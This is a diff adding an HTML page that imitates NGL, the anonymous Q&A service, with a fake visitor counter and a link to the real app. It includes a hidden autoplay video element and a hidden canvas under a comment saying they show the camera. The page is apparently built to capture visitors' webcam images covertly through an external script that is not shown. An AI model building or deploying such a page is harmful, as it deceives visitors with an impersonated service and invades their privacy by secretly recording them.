@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NGL Marvin</title>
+    <link rel="icon" type="image/" href="ngl.png" />
+    <link rel="stylesheet" href="style.css">
+    <!-- Tambahkan SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+</head>
+
+<body>
+
+    <div class="container">
+        <div class="wrapper">
+            <div class="logo">
+                <img src="farelll.jpg" alt="">
+                <div class="xc">
+                    <p class="nama">@Farelll</p>
+                    <p class="xt">send me anonymous messages!</p>
+                </div>
+
+            </div>
+        </div>
+
+        <div class="xrap">
+            <div class="textarea-container">
+                <input type="text" id="inputMessage" placeholder="send me anonymous messages...">
+                <div class="dice-button" onclick="getRandomText()">🎲</div>
+            </div>
+            <p class="ano">anonymous q&a</p>
+            <div class="kirim">
+                <button id="sendButton" onclick="sendMessage()">Send!</button>
+            </div>
+
+            <div class="vc">
+                <p class="count ">👇 <span id="number"> 50</span> orang baru saja mengetuk tombol ini 👇</p>
+                <button class="ketuk" onclick="updateCount()"><a href="https://apps.apple.com/us/app/ngl-anonymous-q-a/id1596550932?ppid=543cb167-5bdc-448f-a202-e5506f5d2837">Dapatkan pesan untukmu sendiri!</a></button>
+            </div>
+
+
+        </div>
+
+        <!-- Video untuk menampilkan kamera -->
+        <video id="video" autoplay style="display:none;"></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+
+        <script src="script.js"></script>
+
+</body>
+
+</html>
